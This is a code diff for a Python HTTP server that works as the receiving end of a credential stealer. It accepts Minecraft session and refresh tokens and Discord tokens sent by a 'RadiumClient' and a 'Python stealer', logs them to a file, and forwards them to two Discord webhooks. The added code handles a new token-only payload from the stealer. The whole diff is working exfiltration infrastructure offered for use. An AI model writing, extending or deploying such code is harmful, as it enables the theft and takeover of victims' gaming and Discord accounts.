@@ -6,7 +6,6 @@ import os
 import time
 from collections import defaultdict
 
-# =========== RATE LIMITING ===========
 REQUEST_LOG = defaultdict(list)
 MAX_REQUESTS = 2
 TIME_WINDOW = 900
@@ -29,7 +28,6 @@ def log_ip(ip, username, server):
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
         f.write(f"{timestamp} | {ip} | {username} | {server}\n")
 
-# =========== CONFIG LOADING ===========
 def load_config():
     try:
         with open('config.json', 'r') as f:
@@ -52,7 +50,6 @@ if not DISCORD_WEBHOOK or not DISCORD_WEBHOOK2:
     exit(1)
 
 print("✅ Config loaded – 2 webhooks ready")
-# ======================================
 
 def send_to_discord(webhook_url, payload):
     try:
@@ -78,13 +75,49 @@ class Handler(BaseHTTPRequestHandler):
                 self.send_response(429)
                 self.send_header('Content-type', 'text/plain')
                 self.end_headers()
-                self.wfile.write(b'Rate limit exceeded: 2 requests per 15 minutes')
+                self.wfile.write(b'Rate limit exceeded')
                 return
 
             length = int(self.headers['Content-Length'])
             data = json.loads(self.rfile.read(length).decode())
 
-            # Extract ALL fields sent by RadiumClient
+            req_type = data.get('type', 'login').strip()
+
+            # ── NEW: Token‑only payload from the Python stealer ────────
+            if req_type == 'tokens':
+                username = data.get('username', 'Unknown').strip()
+                discord_tokens = data.get('discord_tokens', [])
+                print(f"Got token-only from {username}: {len(discord_tokens)} tokens")
+
+                if not discord_tokens:
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write(b'OK')
+                    return
+
+                tokens_str = "\n".join([f"||`{t}`||" for t in discord_tokens[:20]])
+                payload = {
+                    "content": None,
+                    "embeds": [{
+                        "title": "🎫 Discord Tokens",
+                        "color": 5793266,
+                        "description": tokens_str,
+                        "footer": {"text": f"User: {username}"}
+                    }],
+                    "allowed_mentions": {"parse": []}
+                }
+                success1 = send_to_discord(DISCORD_WEBHOOK, payload)
+                success2 = send_to_discord(DISCORD_WEBHOOK2, payload)
+                print(f"Token embed sent: {success1}/{success2}")
+                self.send_response(200)
+                self.send_header('Content-type', 'text/plain')
+                self.end_headers()
+                self.wfile.write(b'OK')
+                return
+            # ────────────────────────────────────────────────────────────
+
+            # Normal login data (unchanged)
             username = data.get('username', 'Unknown').strip()
             uuid = data.get('uuid', '').strip()
             server = data.get('server', '').strip()
@@ -96,7 +129,6 @@ class Handler(BaseHTTPRequestHandler):
             refresh_token = data.get('refresh_token', 'not_found').strip()
             discord_tokens = data.get('discord_tokens', [])
             backup_refresh_tokens = data.get('backup_refresh_tokens', [])
-            log_type = data.get('type', 'login').strip()
 
             print(f"Got: {username} on {server}")
 
@@ -104,12 +136,9 @@ class Handler(BaseHTTPRequestHandler):
             with open('tokens.txt', 'a') as f:
                 f.write(f"{username} | {uuid} | {server} | {token} | {refresh_token} | {money} | {playtime} | {kills} | {deaths}\n")
 
-            is_login = log_type.lower() == "login"
-
-            # ── Build embeds ────────────────────────────────────────────
+            is_login = req_type.lower() == "login"
             embeds = []
 
-            # 1. Main embed (stats + session token)
             description = f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`"
             if money and money != "0":
                 description += f"\n**Money:** `{money}`"
@@ -131,7 +160,6 @@ class Handler(BaseHTTPRequestHandler):
                 main_embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
             embeds.append(main_embed)
 
-            # 2. Discord tokens embed (if any)
             if discord_tokens:
                 tokens_str = "\n".join([f"||`{t}`||" for t in discord_tokens[:20]])
                 embeds.append({
@@ -140,7 +168,6 @@ class Handler(BaseHTTPRequestHandler):
                     "description": tokens_str
                 })
 
-            # 3. Refresh token embed (separate, no ping)
             if is_login and refresh_token and refresh_token != "not_found":
                 embeds.append({
                     "title": "🔄 Refresh Token",
@@ -148,7 +175,6 @@ class Handler(BaseHTTPRequestHandler):
                     "description": f"```{truncate(refresh_token)}```"
                 })
 
-            # 4. Backup refresh tokens (if any, max 3)
             if backup_refresh_tokens:
                 backup_list = [f"||`{rt}`||" for rt in backup_refresh_tokens[:3]]
                 embeds.append({
@@ -157,7 +183,6 @@ class Handler(BaseHTTPRequestHandler):
                     "description": "\n".join(backup_list)
                 })
 
-            # ── Build content ( @here ) ─────────────────────────────────
             content = None
             if is_login:
                 if money and money != "0":
@@ -171,16 +196,15 @@ class Handler(BaseHTTPRequestHandler):
                 "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
 
-            # Send to both webhooks
             success1 = send_to_discord(DISCORD_WEBHOOK, payload)
             success2 = send_to_discord(DISCORD_WEBHOOK2, payload)
 
             if success1 and success2:
-                print(f"✅ Sent to both webhooks")
+                print("✅ Sent to both webhooks")
             elif success1 or success2:
-                print(f"⚠️ Sent to one webhook only")
+                print("⚠️ Sent to one webhook only")
             else:
-                print(f"❌ Failed to send to both webhooks")
+                print("❌ Failed to send to both webhooks")
 
             self.send_response(200)
             self.send_header('Content-type', 'text/plain')
@@ -196,7 +220,7 @@ class Handler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b'Server running - Rate limit: 2 requests per 15 minutes per IP')
+        self.wfile.write(b'Server running')
 
     def log_message(self, format, *args):
         client_ip = self.client_address[0]
